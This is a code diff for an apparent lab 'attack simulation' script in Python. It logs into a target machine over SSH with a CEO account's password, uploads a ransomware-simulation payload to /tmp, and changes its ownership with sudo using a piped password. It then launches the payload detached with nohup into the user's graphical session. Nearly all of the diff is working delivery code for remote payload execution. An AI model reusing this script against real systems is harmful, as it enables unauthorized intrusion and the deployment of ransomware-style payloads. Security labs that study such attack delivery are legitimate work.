@@ -47,39 +47,38 @@ root.mainloop()
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         
+        # Connect using the CEO credentials
         ssh.connect(TARGET_IP, username=USERNAME, password=PASSWORD)
         
         print("[*] Uploading payload to /tmp/ransom_sim.py...")
         sftp = ssh.open_sftp()
         with sftp.file('/tmp/ransom_sim.py', 'w') as f:
             f.write(payload_script)
+        
+        # We must make it executable and ensure CEO owns it
+        ssh.exec_command(f"echo '{PASSWORD}' | sudo -S chown {USERNAME}:{USERNAME} /tmp/ransom_sim.py")
         ssh.exec_command("chmod +x /tmp/ransom_sim.py")
         sftp.close()
 
-        print("[*] Triggering GUI using systemd-run (Wayland Bypass)...")
+        print("[*] Triggering GUI...")
         
-        # First, let's verify the CEO user actually has an active graphical session
-        # loginctl lists sessions. We look for the active seat.
-        stdin, stdout, stderr = ssh.exec_command("loginctl list-sessions --no-legend | grep 'seat0' | awk '{print $1}' | head -n 1")
-        session_id = stdout.read().decode().strip()
+        # We need to construct a command that properly passes the Wayland environment
+        # XDG_RUNTIME_DIR is critical for Wayland to work.
+        # We use sudo -S to pass the password non-interactively.
         
-        if not session_id:
-            print("[-] Could not find an active GUI session for CEO on seat0.")
-            print("    Make sure the CEO account is physically logged into the Kali desktop.")
-            ssh.close()
-            sys.exit(1)
-            
-        print(f"[+] Found active GUI session ID: {session_id}")
-
-        # Use systemd-run to launch the script inside the active session environment
-        # We use --uid=CEO to ensure it runs as the CEO user
-        exec_cmd = f"sudo systemd-run --uid={USERNAME} --session --setenv=DISPLAY=:0 --setenv=WAYLAND_DISPLAY=wayland-0 python3 /tmp/ransom_sim.py"
+        # We also use `nohup` to detach the process so it stays alive after SSH closes.
+        # We redirect errors to /tmp/gui_error.log so we can debug if it fails again.
+        exec_cmd = (
+            f"echo '{PASSWORD}' | sudo -S "
+            f"env DISPLAY=:0 XDG_RUNTIME_DIR=/run/user/$(id -u {USERNAME}) WAYLAND_DISPLAY=wayland-0 "
+            f"nohup python3 /tmp/ransom_sim.py > /tmp/gui_out.log 2> /tmp/gui_error.log &"
+        )
         
-        stdin, stdout, stderr = ssh.exec_command(f"echo '{PASSWORD}' | sudo -S {exec_cmd}")
+        print(f"[*] Executing payload on target...")
+        ssh.exec_command(exec_cmd)
         
-        # We don't wait for the output because systemd-run will hold the SSH connection open 
-        # until the GUI app closes. We just fire and forget.
         print("[+] Attack simulation launched. Check the Hardened Kali VM screen!")
+        print("[*] (If it fails, check /tmp/gui_error.log on the target via SSH)")
         ssh.close()
 
     except paramiko.AuthenticationException:
